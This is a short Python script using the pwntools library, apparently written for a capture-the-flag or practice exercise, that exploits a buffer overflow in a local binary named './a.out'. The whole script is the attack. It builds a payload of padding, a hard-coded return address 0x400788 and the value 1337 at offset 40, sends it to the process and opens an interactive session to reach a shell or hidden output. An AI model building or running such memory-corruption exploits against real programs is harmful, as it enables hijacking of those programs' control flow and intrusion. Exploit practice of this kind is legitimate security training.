#!/usr/bin/env python3
"""Buffer overflow exploit for ./a.out"""

from pwn import *

# Set context
context.log_level = "debug"
context.arch = "amd64"

# Start process
r = process("./a.out")

# Return address at offset 8, pwd[0] at offset 40 (from cyclic_find)
buf = b"A" * 8
buf += p64(0x400788)   # Return address / overwrite target
buf += b"B" * 24       # Padding to offset 40
buf += p32(1337)       # pwd[0] value at offset 40

log.info("Payload length: %d", len(buf))
log.info("Payload:\n%s", hexdump(buf))

# Send payload
r.sendline(buf)

# Interact with process (shell or output)
r.interactive()
